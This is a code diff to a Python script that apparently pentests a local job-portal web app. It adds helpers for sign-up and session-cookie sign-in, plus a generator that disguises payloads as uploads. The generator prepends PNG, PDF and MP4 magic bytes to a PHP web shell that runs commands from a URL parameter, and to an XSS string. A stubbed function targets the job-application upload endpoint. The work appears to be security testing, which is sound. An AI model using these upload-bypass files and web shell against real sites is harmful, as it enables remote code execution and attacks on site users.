@@ -6,13 +6,27 @@ ACCOUNT = {
     "password": "asd",
 }
 
+COMPANY = {
+    "name": "asdasd",
+    "email": "asd@as.com",
+    "password": "asd",
+    "location": "asd",
+    "about": "asd",
+}
+
 HOST = "http://localhost:8080/"
 
-PHPSESSID = ""
+PHPSESSID_USER = ""
+PHPSESSID_COMPANY = ""
 
-headers = {
-    "Cookie": f"PHPSESSID={PHPSESSID}"
-}
+def get_headers(isUser: bool):
+    global PHPSESSID_USER, PHPSESSID_COMPANY
+    
+    headers = {}
+    
+    headers['Cookie'] = f"PHPSESSID={PHPSESSID_USER}" if isUser else f"PHPSESSID={PHPSESSID_COMPANY}"
+    
+    return headers
 
 def encoded_custom(input_text: str):
     ans = ""
@@ -21,31 +35,37 @@ def encoded_custom(input_text: str):
     
     return ans
 
-def do_signup(option: int):
-    global PHPSESSID, headers
-    url = "auth/sign-up/job-seeker"
+def do_signup():
+    global ACCOUNT, COMPANY
+    url = "auth/sign-up/"
     
-    body = {
-        "name": "asd",
-        "email": "asd@asd.com",
-        "password": "asd",
-    }
+    # signup user
+    res = requests.post(HOST + url + "job-seeker", data=ACCOUNT)
+    print(res.status_code)
     
-    res = requests.post(HOST + url, data=body)
-    print(res.status_code, res.text)
+    # signup company
+    res = requests.post(HOST + url + "company", data=COMPANY)
+    print(res.status_code)
+    
+    
 
-def do_signin():
-    global PHPSESSID, headers
+def do_signin(isUser: bool):
+    global PHPSESSID_USER, PHPSESSID_COMPANY
+    
     url = "auth/sign-in"
     payload = {
-        "email": ACCOUNT['email'],
-        "password": ACCOUNT['password']
+        "email": ACCOUNT['email'] if isUser else COMPANY['email'],
+        "password": ACCOUNT['password'] if isUser else COMPANY['email']
     }
     
     # get the id first
     res = requests.get(HOST + url)
     PHPSESSID = res.cookies.get('PHPSESSID')
-    headers["Cookie"] = "PHPSESSID=" + PHPSESSID
+    
+    if isUser:
+        PHPSESSID_USER = PHPSESSID
+    else:
+        PHPSESSID_COMPANY = PHPSESSID
     
     # sign in (same session id)
     res = requests.post(HOST + url, data=payload)
@@ -69,32 +89,42 @@ def do_jobsearch():
     # print(res.text)
     
 
-def generate_file():
-    png_signature = bytes.fromhex("89 50 4E 47 0D 0A 1A 0A")
+def generate_file(signature: str, payload: str, filename: str):
     
-    pdf_signature = b"%PDF-1.7\n"
+    SIGNATURES = {
+        "PNG": bytes.fromhex("89 50 4E 47 0D 0A 1A 0A 0000 000d 4948 4452"),
+        "PDF": bytes.fromhex("2550 4446 2d31 2e37 0a25 e2e3 cfd3 0a37"),
+                            #  2030 206f 626a 0a3c"),
+        "MP4": bytes.fromhex("00 00 00 1c 66 74 79 70 6d 70 34 32 00 00 00 01 6973 "),
+                            #  6f6d 6d70 3431 6d70 3432 0000 1e9a 6d6f 6f76 0000 006c 6d76 6864 0000 0000 e111 1048 e111 1049 0000 ac44 0007 66ec"),
+    }
     
-    php_code = '<html><?php echo "iniedbertawikwok"; ?>\n<img src=x onerror=alert(1));>\n<script>alert(1)</script></html>'
+    PAYLOAD_LIST = {
+        "php_rce": b"<?php echo system(\$_GET['cmd']); ?>",
+        "xss": b"<html><?php echo 'iniedbertawikwok'; ?>\n<img src=x onerror=alert(1));>\n<script>alert(1)</script></html>",
+    }
     
-    output_filename = "payload_test.pdf"
+    file_content = SIGNATURES[signature] + PAYLOAD_LIST[payload]
     
-    # Convert PHP code to bytes
-    php_payload = php_code.encode("utf-8")
-    
-    # Combine the PDF signature and PHP payload
-    file_content = php_payload
-    
-    # Write the content to the output file
-    with open(output_filename, "wb") as f:
+    with open(filename, "wb") as f:
         f.write(file_content)
     
-    print(f"Generated file: {output_filename}")
+    print(f"Generated file: {filename}")
+    return filename
+
+def send_file(file_path: str):
+    url = "http://localhost:8080/jobs/75969/apply"
+    
+    pass
     
 if __name__ == "__main__":
     # done sign in
-    # do_signin()
+    # do_signup()
+    # do_signin(True)
+    # do_signin(False)
     
     # try to upload file
-    # print(PHPSESSID)
     # do_jobsearch()
-    generate_file()
+    generate_file("PNG", "xss", "payload_test.png")
+    generate_file("PDF", "xss", "payload_test.pdf")
+    generate_file("MP4", "xss", "awikwok.mp4")
